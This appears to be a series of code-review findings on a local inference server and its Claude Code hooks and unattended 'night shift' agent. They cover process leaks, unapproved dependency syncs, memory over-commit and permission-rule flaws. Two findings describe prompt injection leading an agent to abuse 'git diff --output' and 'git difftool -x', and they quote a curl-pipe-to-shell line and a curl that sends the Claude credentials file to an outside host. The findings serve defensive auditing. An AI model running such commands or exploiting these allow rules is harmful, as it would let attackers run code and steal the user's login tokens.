evidence: Entry point: the Stop event of Claude Code -> .claude/settings.json:8-10 runs quick-check.sh --stop-hook with "timeout": 900 -> quick-check.sh:46 `check > "$STATE/last.log" 2>&1` -> quick-check.sh:24 `uv run pytest tests/ -q -x`, which has no time limit of its own. The GPU tests (tests/test_sessions.py, tests/test_direct_read.py) call waits without a timeout: engine/runtime/sessions.py:276, :295, :301 `self.cv.wait()` and engine/weights/direct.py:133, :137, :159 `queue.get()`. A change with a lost wakeup there hangs pytest forever. The hook runs exactly after such a change, when the code differs from HEAD (:37) and from the last pass (:39). The script sets no trap. A SIGTERM to its pid ends bash, and `uv` and its python child keep running. The child writes to last.log, not to the hook's pipe, so no SIGPIPE ends it. The hook only increments `blocks` after check returns (:56), and only updates `passed` on a pass (:49). A killed hook changes neither file, so the MAX_BLOCKS guard (:42) never trips and the next turn end runs pytest again.
failure_scenario: Turn 1: the session edits engine/runtime/sessions.py and adds a lost wakeup. The turn ends, and quick-check.sh:46 starts pytest. tests/test_sessions.py blocks in SessionStore.wait (sessions.py:295). At 900 s, Claude Code ends the hook. If it signals only the hook's pid, bash exits, and the pytest process stays alive with its CUDA context, its pinned buffers and its writer thread. blocks stays at 0 and passed keeps the old fingerprint. Turn 2: the model edits again, and the code still hangs. The hook starts a second pytest, which also hangs: now two orphans. Each turn adds one orphan in the unified memory next to the server's 61 GB, and nothing ends them. Each such turn also waits 15 minutes before it ends.
fix: In check(), give pytest a limit below the hook's 900 s: `timeout -k 10 600 uv run pytest tests/ -q -x`. GNU timeout runs the command in its own process group and signals the whole group. Show exit status 124 in the log tail as a hang. Do not use `trap 'kill 0'`: the hook can share the process group of Claude Code.
other_instances: tools/night_shift.py:245 (a task's env can set COLINFER_STOP_CHECK=1; tools/night_shift.py:456-457 kills the process group only on timeout, memory or stop, so an orphan from a hook timeout outlives a task that ends normally, and the next task starts next to it)

repro_notes: not-reproduced. Claude Code (2.1.301 extension, 2.1.296 CLI) starts the Stop hook in its own process group and kills the whole group at the hook timeout; the night shift's kill_group on claude also kills it. 0 of 3 runs leaked for each version. A SIGTERM to the hook's bash pid alone leaves uv and python orphans (3 of 3), but neither Claude Code version does that. Remaining cost: a hung pytest costs the full 900 s at each turn end, because a timed-out hook updates neither blocks nor passed. Not tested: a pytest in D state inside a CUDA call.
title: The Stop hook's pytest has no timeout of its own; a hung run outlives the kill
verify_with: Leak of processes (the files/threads/descriptors row, counted with pgrep). (1) Script level, no GPU: in D/repro/n/, make a git repo that contains all six CODE paths (engine, tests, tools, bench, csrc, pyproject.toml). If one path is missing, the snapshot at :38 fails and the hook exits 0. Copy tools/review.py into the repo and make one uncommitted change under tools/. Put a fake `uv` first on PATH: `case "$2" in pytest) exec sleep 600;; *) exit 0;; esac`. Run `echo '{}' | CLAUDE_PROJECT_DIR=<repo> bash .claude/hooks/quick-check.sh --stop-hook & pid=$!; sleep 5; kill -TERM $pid; sleep 1; pgrep -f 'sleep 600'`. Expect a surviving child, and expect <repo>/.cache/quick-check/blocks to stay 0. MemAvailable must be at least 16 GB, or the hook skips pytest. (2) Claude Code level: `claude -p hi --settings <file with a Stop hook whose command runs `sleep 600` and whose timeout is 5>`, then run pgrep after claude exits. This shows whether Claude Code signals the process group. If it does, lower the finding to medium: each turn then costs 15 minutes, and nothing leaks.

evidence: SKILL.md:47-54 gives the output of `known RUN` to each finder as 'do not report these known findings again'. SKILL.md:61-63 removes any merged finding that KNOWN already has. review.py:203-206 lists every record of an earlier run on a file of the scope, whatever its decision, so it includes decision 'fixed'. review.py:223-234 `recurring` counts fixed findings to propose rules, but a defect that comes back at the same file and symbol never reaches the ledger again. docs/review.md:86-87 gives noise as the reason for the dedup ('a noisy lens'), and a fixed finding is not noise.
failure_scenario: Run A finds a missing 400 check in engine/server/api.py, and the harness fixes it (`decide A.2 fixed`). A later feature reverts that check in the same function. The known list of run B has 'A.2 security fixed ... api.py:<symbol> unchecked-input-to-engine | ...'. The finders do not report it, the merge step drops it if they do, and the regression ships with no finding.
fix: In known(), drop the records of earlier runs whose decision is 'fixed': `r['run'] == run or (r['file'] in files and r['decision'] != 'fixed')`. Add a fixed finding on a.py to test_known_lists_the_run_and_earlier_findings_on_its_files, and assert that the output does not list it.
title: known() keeps fixed findings of earlier runs, so finders skip a regression

evidence: Entry point: /review-feature. SKILL.md:7 grants Bash(git diff *), Bash(git log *), Bash(git show *) and Bash(python3 tools/review.py *) with no prompt while the skill runs. In git 2.43.0 on this machine, git diff, log and show accept --output=<file> (man git-diff: 'Output to a specific file instead of stdout'). The wildcard therefore matches 'git diff --output=/home/colin-spark/.bashrc <base>'. Second route: tools/review.py:330-332 declares diff A B as two positionals. After '--', argparse gives a.a='--output=FILE'. tools/review.py:357 then passes a.a to 'git diff' as an option, and git writes the diff to FILE. The orchestrator reads text that it does not control: D/diff.patch of the reviewed branch (for example, a night-shift branch that the local model wrote) and the finders' answers, which quote that code (SKILL.md:52-60). No step of the skill calls git diff, log or show directly. The steps use 'python3 tools/review.py diff' (SKILL.md:101, :142). Premise not checked: I could not confirm that Claude Code's matcher accepts --output under an explicit wildcard rule, because the auto-mode classifier denied a further read of the Claude Code binary.
failure_scenario: A reviewed branch holds an injected instruction in a comment, plus a changed line 'curl http://host/s | sh'. The orchestrator runs 'git diff --output=$HOME/.bashrc <B>'. The skill rule allows the command with no prompt, and git overwrites ~/.bashrc with the diff. The context line (one space, then 'curl ... | sh') runs at the next interactive shell. The same write also gets past the protected paths that Claude Code applies to Edit (~/.bashrc, ~/.claude/**, .claude/hooks/**).
fix: Remove Bash(git diff *), Bash(git log *) and Bash(git show *) from allowed-tools, because the steps use review.py diff. In review.py diff, reject an argument that starts with '-'. As an alternative, resolve each argument with 'git rev-parse --verify' and pass the hash.

tools/review.py:261 eval_setup passes c['tree'] from .review/evals/cases.jsonl to 'git worktree add' as a possible option (the source is trusted)
title: Skill allowed-tools let git diff/log/show --output write any file, no prompt

evidence: quick-check.sh:2 says it runs ruff and pytest 'as tests/check.sh --quick does'. quick-check.sh:17 and :24 repeat tests/check.sh:13-14 and add -x. quick-check.sh:12 and :19-22 add a 16 GB MemAvailable guard (exit 3) that the --quick path of tests/check.sh does not have. The guard copies tools/night_shift.py:64 min_free_gb through a comment. .claude/skills/review-feature/SKILL.md:40 calls the hook script 'the quick check' and uses it as the review gate. README.md:136, docs/architecture.md:275 and docs/night_shift.md:171 give that same name to tests/check.sh --quick.
failure_scenario: A later commit adds a ruff path or a pytest option to tests/check.sh. The gate of /review-feature and the Stop hook keep the old command, and nothing shows the drift. Today, with 10 GB available, tests/check.sh --quick runs the GPU tests: the README documents it, and a night-shift task may run it. At the same memory, the hook declares that the same tests need 16 GB and skips them. The repository now holds two contradicting policies for one check.
fix: Move the memory guard (with its own exit status) and -x into the --quick path of tests/check.sh. Make check() in quick-check.sh call tests/check.sh --quick, so that one script owns the quick check and its memory threshold.
title: quick-check.sh is a second copy of tests/check.sh --quick with a different policy

evidence: Entry point: the Stop hook. .claude/settings.json:8-10 runs quick-check.sh --stop-hook in every Claude Code session of this repository, Qwen sessions included. quick-check.sh:35 exits only when COLINFER_STOP_CHECK=0, and only the night shift sets it (tools/night_shift.py:245). Thus interactive sessions go on. quick-check.sh:10 puts pyproject.toml in CODE, and quick-check.sh:37 calls check() on any change under CODE. quick-check.sh:17 runs 'uv run ruff' and quick-check.sh:24 runs 'uv run pytest'. By default, uv run locks and syncs .venv from the pyproject.toml in the working tree, with its [[tool.uv.index]] entries (pyproject.toml:86-100). It downloads, builds and installs new packages, and the Bash permission system does not check this. pytest also imports the edited tests/ and engine/ code. Before this diff, the same actions ran only through a Bash command that the permission system checks.
failure_scenario: In acceptEdits mode, a session edit adds a dependency or a new [[tool.uv.index]] to pyproject.toml, and Claude Code accepts the edit with no prompt. At the end of the turn, the hook runs 'uv run ruff'. uv then resolves, downloads and builds the new package (its sdist build code runs), and no one approves it.
fix: In check(), use 'uv run --no-sync' (this implies --frozen), or call .venv/bin/ruff and '.venv/bin/python -m pytest' as memrace-verifier.md does. Keep the explicit sync in the manual gate only.
title: Stop hook's uv run syncs an edited pyproject.toml at each turn end, no prompt

evidence: Entry point: `python3 tools/review.py eval-setup` (review.py:365-366) -> eval_setup creates the run (:258), then runs `git worktree add` for each case (:259-261). A ReviewError from git() (:50-51) at case k propagates. Causes: an unknown commit in `tree`, or a repeated `name`, whose path then exists. eval.json (:262-264) is not written. eval_score opens eval.json (:278) and raises FileNotFoundError, so its removal loop (:316-318) never runs. No other command removes the worktrees.
failure_scenario: .review/evals/cases.jsonl has three cases, and the third has a typo in `tree`. eval-setup exits 1 after it adds two worktrees under .review/runs/<run>/trees/. Each one is a 1.9 MB checkout with an entry in .git/worktrees. `git worktree list` keeps them, and each retry adds two more. An eval run that stops before it writes results.json also leaves all its worktrees: eval-score raises FileNotFoundError at :280, before the cleanup.
fix: In eval_setup, wrap the loop in try/except. On an error, run `git worktree remove --force` on the trees added so far, then raise again. As an alternative, write eval.json before the loop, so that a cleanup can find the trees.

evidence: Why this is in round 2: the r2 patch fixes finding 20261016-225027.3. It removes Bash(git diff *), Bash(git log *) and Bash(git show *) from .claude/skills/review-feature/SKILL.md:7, because git diff/log/show --output=FILE writes any file. The patch does not touch the same rules in tools/night_shift.py:47. That file is in scope.json (status M), and SKILL.md:128-129 says that a fix must cover each place of the bug_class in the files of the scope. So the class fix is incomplete. The night-shift instance is also the worse one. Path: the night-shift run (deploy/colinfer-night-shift.timer, unattended) -> tools/night_shift.py:378 run_task -> :405 _run_claude(claude_argv(...)) -> :253 perms allow = list(ALLOW) + task.allow -> :254-255 claude -p --permission-mode acceptEdits --permission-prompts none --settings <perms>. In this mode the allow list is the only sandbox (docs/night_shift.md:156-165: 'Do not allow ... anything that reaches outside the worktree'). ALLOW at :47 is ('Bash(git status*)', 'Bash(git diff*)', 'Bash(git log*)', 'Bash(git show*)'). The rule 'Bash(git diff*)' has no space before '*'. Thus it also matches 'git difftool' (Claude Code docs: 'Bash(ls*)' matches 'lsof'). 'git difftool -y -x CMD' runs CMD through the shell: $(git --exec-path)/git-difftool--helper:62 runs 'eval $GIT_DIFFTOOL_EXTCMD ...'. 'Bash(git diff*)', 'Bash(git log*)' and 'Bash(git show*)' also match '--output=FILE' (git 2.43.0 on this machine), which writes any file outside the worktree. docs/night_shift.md:53 and tools/night_shift.py:13 call these rules 'read-only'. Severity: unattended arbitrary command execution as the user, against the documented sandbox, is a security boundary failure (critical in slop-detector.md). From there a command can reach failure 5 (it can read the login token in ~/.claude/.credentials.json and send it out) and failure 3 (it can start tests/golden.py next to the server). Premise not checked: I did not run Claude Code 2.1.296's matcher on 'git difftool -y -x ...' under 'Bash(git diff*)'. The --output route (git diff --output=/abs/path) matches the rule with or without the space.
failure_scenario: A night-shift task works in a repository with an injected instruction in a README or in a test fixture, or the local model simply makes a mistake. The model writes x.sh in its worktree. The acceptEdits mode allows this with no prompt. Then the model runs 'git difftool -y -x "sh x.sh" HEAD~1 HEAD'. The ALLOW rule matches, git evals the command, and x.sh runs as the user at night with no prompt. For example, x.sh can run 'curl -d @$HOME/.claude/.credentials.json http://host/', or it can load the model next to the server. A shorter route: 'git diff --output=/home/colin-spark/.bashrc HEAD~1' writes the diff over ~/.bashrc, outside the worktree, and a context line of the diff then runs at the next interactive shell.
fix: In ALLOW, put a space before the wildcard ('Bash(git diff *)', 'Bash(git log *)', 'Bash(git show *)', 'Bash(git status *)', plus the bare forms without arguments), so that the rules do not match difftool. Add 'Bash(git difftool*)' and deny rules for '--output' (for example 'Bash(git * --output*)') to DENY. Deny takes precedence over allow. Remove the word 'read-only' at tools/night_shift.py:13 and docs/night_shift.md:53. In tests/test_night_shift.py, near :133, add a test which asserts that the perms of claude_argv deny difftool and --output.
other_instances: tools/night_shift.py:13 the docstring calls the ALLOW rules 'the read-only git commands'
docs/night_shift.md:53 'Read-only git (git status, diff, log, show) is always allowed'
title: Night-shift ALLOW rule git diff* allows difftool -x and --output, no prompt

evidence: SKILL.md:36-38 starts tests/check.sh with run_in_background: true, and the result arrives later as a notification. SKILL.md:135 (step 7) runs the same check again after the fixes. To wait, the model ends its turn. settings.json:3-10 then runs quick-check.sh --stop-hook. quick-check.sh:37 continues because the fixes are uncommitted code paths. quick-check.sh:39 continues because tests/check.sh never writes .cache/quick-check/passed. quick-check.sh:20 passes its 16 GB guard because golden.py has not loaded yet. quick-check.sh:24 runs `uv run pytest tests/ -q -x`, and quick-check.sh:12 calls these the GPU tests. This run overlaps check.sh:14 (its own pytest), the 50 GB guard at check.sh:19 and the model checks at check.sh:23-25. check.sh:7-8 says to stop any other GPU job before the model checks, because an over-commit can power off the machine. Before the patch, the check ran in the foreground, so the turn stayed open and the Stop hook could not start during the check.
failure_scenario: Run /review-feature on a feature that changes engine/runtime/. Step 7 fixes a finding in engine/runtime/ and starts tests/check.sh in the background, then ends the turn. Within seconds the Stop hook starts ruff and the GPU pytest. Both pytest runs overlap. When check.sh reaches its 50 GB guard, the hook's pytest still holds memory. Two outcomes are possible. (1) The guard fails with 'stop the server?', and the skill reports a check failure that the code did not cause. (2) The guard passes, and golden.py loads about 40 GB next to the hook's GPU tests. This is the overlap that check.sh:7-8 forbids. Also, a GPU test can fail under the contention. Then the hook exits 2 and sends the model back to 'fix the cause' while check.sh still runs on the same working tree.
fix: In quick-check.sh, in the --stop-hook path after the fingerprint test (line 39), add a skip: when `pgrep -f tests/check.sh` finds a run, print a systemMessage ('quick-check: skipped, tests/check.sh runs') and exit 0. This works the same as the low-memory path at quick-check.sh:52-55. Add this case to the list in docs/review.md section 4.
other_instances: .claude/skills/review-feature/SKILL.md:37 (memrace: Background tests/check.sh overlaps the Stop hook's GPU pytest at the turn end)
refutation: 1 of 3 refuted: the server holds about 88 GB, so check.sh's 50 GB guard refuses with the server up with or without the hook; with the server stopped, golden.py plus the hook's pytest peak near 56 GB of 121 GB. All three agree that the overlap happens.
title: The background full check ends the turn, so the Stop hook runs pytest beside it

evidence: review.py:216 now drops the fixed findings of earlier runs from the known list. SKILL.md:49 and SKILL.md:144 give that list to the finders, and it is their only view of the ledger. finding-format.md:40 tells the finders to reuse a bug_class 'from the known list in your prompt'. The patch did not change that line. review.py:237-243 recurring() groups only the fixed findings, and only by the exact bug_class string across runs. SKILL.md:176 (step 10) proposes a rule only for a class that recurring() lists. Thus the class names of fixed findings no longer reach the finders, and recurring() counts only those findings.
failure_scenario: Round 1 of run 20261016-225027 used 3 class names that the table of finding-format.md does not have: process-leak, suppressed-regression and misleading-comment. Finding .2 (suppressed-regression) is now fixed. A later run on tools/review.py finds a defect of the same class. Its known list omits .2, so the finder makes up another name, for example hidden-regression. recurring() then sees two classes with one run each, so it lists neither. Step 10 proposes no rule.
fix: Keep the fixed findings out of the known list. Make known(run) print one more line with the sorted bug classes of the fixed findings in the ledger ('classes: ...'). Change finding-format.md:40 to point at that line. Add an assert for the line to test_known_lists_the_run_and_the_unfixed_earlier_findings_on_its_files.
title: known() no longer lists fixed bug classes, so recurring() can miss a repeat

evidence: POST /v1/chat/completions, /v1/messages or /v1/messages/count_tokens (api.py:610-613) -> api.py:132 `await request.json()` reads the whole body, and nothing checks content-length or the bytes read -> api.py:297 asyncio.to_thread(fmt.render) -> chat.py:96 apply_chat_template builds the full text -> chat.py:115 backend_tokenizer.encode_batch -> chat.py:127 np.concatenate(...).tolist(), one Python int per token -> the only size check is api.py:226 (len(prompt) + margin > max_len), and it runs after all of this in make_request. The max_queue check at api.py:221 also runs after the render, so concurrent large bodies render in parallel on the to_thread pool. The diff makes this worse: 182f04e raises the resident engine memory from ~61 GB to ~88 GB (deploy/colinfer.service:8-9, docs/server.md:18). That cuts the host headroom on the 121 GB unified memory from ~55 GB to ~28 GB, and none of the host memory is under the torch cap.
failure_scenario: A local client posts one /v1/messages/count_tokens body (no queue check) with a 500 MB user message, or sends a few such bodies at once. The raw bytes, the parsed str, the rendered template text, the tokenizer encodings (ids, offsets, masks) and a ~125M-element Python int list use tens of GB of host memory before the 'prompt is too long' 400. With ~88 GB already held by the engine, the unified memory over-commits and the machine powers off.
fix: In json_body, reject a content-length above a fixed byte limit with a 413, and stop reading the stream at the same limit when there is no content-length. Size the limit from max_seq_len, for example max_seq_len * 16 bytes plus room for base64 images. anthropic.py:40 already maps 413 to request_too_large.
other_instances: engine/server/api.py:612 count_tokens (renders without the max_queue check)
engine/server/api.py:221 max_queue check runs after render
title: Request body size has no limit: host RAM for render and tokenize grows with the body

command: awk '/MemAvailable/ {if ($2 < 16 * 1024 * 1024) {print "memory: " int($2 / 1048576) " GB available"; exit 1}}' /proc/meminfo && .venv/bin/python -m pytest .review/runs/20261023-200138/repro/2/test_repro.py -q -s
evidence: Commit 182f04e changes the default slot length from 262144 to 524288: engine/server/worker.py:39 ServerConfig.max_seq_len, which feeds engine/server/api.py:728 --max-seq-len. Then build_engine (engine/runtime/build.py:112) creates Scheduler -> model.new_state(3, 524288) (engine/runtime/scheduler.py:191) and MtpState(batch=3, 524288) (scheduler.py:205). Each KV tensor is a torch.zeros of [3, Hkv, 524288, 256] fp8 (engine/model/qwen35.py:198), which makes 51.5 GB of KV. The total at startup is about 88 GB (docs/server.md:18, deploy/colinfer.service:8). README.md:37-38 is the requirement for the default Quick start (README.md:46 now says '3 slots x 524,288 tokens'), and it still says 'About 65 GB of free unified memory'. The only guard is engine/server/api.py:764-765 set_per_process_memory_fraction(mem_cap / total). That cap is relative to the total memory, not to the free memory, and its default went up from 80 to 105 GB (api.py:742). On a host with 65-88 GB free, the cap therefore does not stop the startup allocation. No code reads MemAvailable before the allocation: grep finds no MemAvailable or meminfo in engine/.
failure_scenario: A user follows README: 70 GB of unified memory is free (VS Code, a browser and a HF reference run hold the rest), and the user runs 'uv run python -m engine.server' with the defaults. The engine allocates the weights (20.2 GB), the INT copies (5.2 GB), then the 3 x 524288 KV (51.5 GB) and the ring and drafter. At about 70 GB, the allocation is still under the 105 GB torch cap, so torch raises no OOM. The unified pool is over-committed, and the GB10 powers off (REVIEW.md failure 3). Before the patch, the same defaults took about 61 GB, so the 65 GB requirement was true. The patch also lowers the margin: the 105 GB cap leaves 16 GB of the 121 GB for the OS and every host process, where the 80 GB cap left 41 GB.
fix: Change README.md:38 to about 90 GB of free memory, as docs/claude_code.md:41 already says. Pinned host buffers (sessions.py:133-134, mtp.py:226, scheduler.py:199), the CUDA context, the Python process, the tokenizer and the OS share the same ~121 GB and are outside the cap. Before the change, the cap reserved ~41 GB for everything else. Now it reserves ~16 GB. failure_scenario: Torch reserved memory grows toward 105 GB (warmup, vision tower load, chunk workspaces, allocator fragmentation) at the same time as host memory grows (a large request render, image decodes, the page cache of a session restore). Nothing enforces these counts: uvicorn.run has no limit_concurrency; each endpoint reads and parses its body, decodes its images on the 24-thread default executor and renders before the only admission check, max_queue in make_request; count_tokens never reaches it.
